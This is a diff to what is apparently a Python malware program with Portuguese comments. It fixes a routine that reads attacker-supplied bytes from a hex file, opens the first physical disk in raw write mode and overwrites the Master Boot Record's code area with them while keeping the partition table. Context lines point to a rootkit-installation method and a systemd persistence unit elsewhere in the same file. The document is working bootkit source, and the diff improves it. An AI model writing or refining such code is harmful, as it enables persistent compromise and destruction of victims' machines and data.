@@ -1154,40 +1154,44 @@ WantedBy=multi-user.target
         """Infecção do MBR (Master Boot Record) com parser otimizado"""
         if IS_WINDOWS and self.utils.is_admin():
             try:
-                # Parse do arquivo hexadecimal
-                hex_data = []
+                # Correção 1: Ler e parsear o arquivo hexadecimal corretamente
+                malicious_code = b''
                 with open('mbr_code_bytes.txt', 'r') as f:
                     for line in f:
-                        if ':' in line:
-                            hex_part = line.split(':', 1)[1].strip()
-                            hex_data.extend(hex_part.split())
+                        line = line.strip()
+                        if line.startswith('0x'):
+                            # Converte valor hexadecimal para byte
+                            byte_val = int(line[2:], 16)
+                            malicious_code += bytes([byte_val])
                 
-                # Converte hexadecimal para bytes
-                malicious_code = b''.join(bytes([int(x[2:], 16)]) for x in hex_data if x.startswith('0x'))
-                
-                # Lê MBR original
-                with open('\\\\.\\PhysicalDrive0', 'rb') as f:
+                # Correção 2: Usar acesso raw ao disco com modo de leitura binária
+                with open('\\\\.\\PhysicalDrive0', 'r+b') as f:
+                    # Lê apenas o setor do MBR (512 bytes)
                     mbr_data = f.read(512)
-                
-                # Verifica assinatura
-                if mbr_data[510:512] != b'\x55\xaa':
-                    return
-                
-                # Prepara código malicioso (preenche com NOPs se necessário)
-                if len(malicious_code) < 446:
-                    malicious_code += b'\x90' * (446 - len(malicious_code))  # NOP padding
-                else:
-                    malicious_code = malicious_code[:446]
-                
-                # Constrói MBR infectado
-                infected_mbr = malicious_code + mbr_data[446:510] + b'\x55\xaa'
-                
-                # Escreve MBR infectado
-                with open('\\\\.\\PhysicalDrive0', 'wb') as f:
+                    
+                    # Verifica assinatura bootável
+                    if mbr_data[510:512] != b'\x55\xaa':
+                        return
+                    
+                    # Prepara código malicioso (mantém tabela de partição original)
+                    if len(malicious_code) < 446:
+                        malicious_code += b'\x90' * (446 - len(malicious_code))
+                    else:
+                        malicious_code = malicious_code[:446]
+                    
+                    # Constrói MBR infectado preservando a tabela de partição original
+                    infected_mbr = (
+                        malicious_code +      # Código manipulado
+                        mbr_data[446:510] +   # Tabela de partição original
+                        b'\x55\xaa'           # Assinatura bootável
+                    )
+                    
+                    # Retorna ao início do disco para sobrescrever
+                    f.seek(0)
                     f.write(infected_mbr)
                     
             except Exception as e:
-                print(f"Erro: {e}")
+                print(f"Erro na infecção do MBR: {e}")
                 
     def _rootkit_installation(self):
         """Instalação de rootkit"""
@@ -3442,3 +3446,4 @@ if __name__ == "__main__":
         except Exception:
             pass
             
+
